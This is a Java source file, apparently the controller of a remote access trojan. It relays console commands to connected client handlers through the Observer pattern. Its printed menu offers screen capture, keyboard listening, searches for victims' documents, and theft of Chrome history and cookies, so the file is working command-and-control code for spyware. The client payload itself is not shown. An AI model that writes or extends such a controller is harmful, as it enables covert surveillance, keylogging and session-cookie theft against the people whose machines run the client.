/**
 * Writers: Dror Ventura, Shimrit Hoori
 * 
 */
package server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Observable;

/**
 * The Server side is broadcasting messages to client through the
 * Java Observer design pattern
 */
public class Server extends Observable {
	
    private boolean running;
    private int port;

    /**
     * getter
     * @return - rather the server has been shutdown gracefully
     */
    public synchronized boolean isRunning() {
        return running;
    }

    /**
     * setter
     * @param running - update a shutdown request
     */
    public synchronized void setRunning(boolean running) {
        this.running = running;
    }

    /**
     * getter
     * @return - the server's port
     */
    public int getPort() {
        return port;
    }

    /**
     * setter
     * @param port - the server's port
     */
    public void setPort(String port) {
        this.port = Integer.parseInt(port);
    }

    /**
     * Main flow of the server keeps going until it
     * receives the "quit" message from the System.in
     * by the controller of the server
     * upon each message it set's up an event an notify all clients (Observers).
     *
     * Each Observer is a ConnectionHandler class the runs on it's own thread
     */
    public void startServer() {
        while(isRunning()) {
            try {
                String message;
                do {
                    printMenu();

                    InputStreamReader inputStreamReader = new InputStreamReader(System.in);
                    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                    message = bufferedReader.readLine();

                    setChanged();

                    if (message.equals("quit")){
                        notifyObservers("0");
                    }
                    else {
                        notifyObservers(message);
                    }
                } 
                while(!message.equals("quit"));
            }
            catch (IOException ioException) {
                ioException.printStackTrace();
            }
            finally {
                setRunning(false);
                System.out.println("Server is shutting down");
                // shutdown gracefully
                try {
                    Thread.sleep(10000);
                }
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    /**
     * Echos the instructions menu to screen.
     */
    private void printMenu() {
        StringBuilder menu = new StringBuilder();
        menu.append("\nReady to send new commands\n");
        menu.append("select commands sepateing them by ';'\n");
        menu.append("i.e. x;y  \n");
        menu.append("\t0. Close Connection\n");
        menu.append("\t1. Print Screen\n");
        menu.append("\t2. Listen On Keyboard\n");
        menu.append("\t3. Search For Documents (txt,doc,pdf,xls)\n");
        menu.append("\t4. Get Chrome's History And Cookies");

        System.out.println(menu);
    }

    /**
     * Server's initialization method, prepare settings and calls the main flow
     * @param args - a PORT is mandatory to supply!
     */
    public static void main(String args[]) {
        if (args.length < 1) {
            System.out.println("Port is missing");
            System.exit(1);
        }

        Server server = new Server();
        server.setPort(args[0]);

        final Listener listener = new Listener(server);
        Thread listenerThread = new Thread(listener);
        listenerThread.start();

        server.startServer();
        listener.stopListening();
    }
}
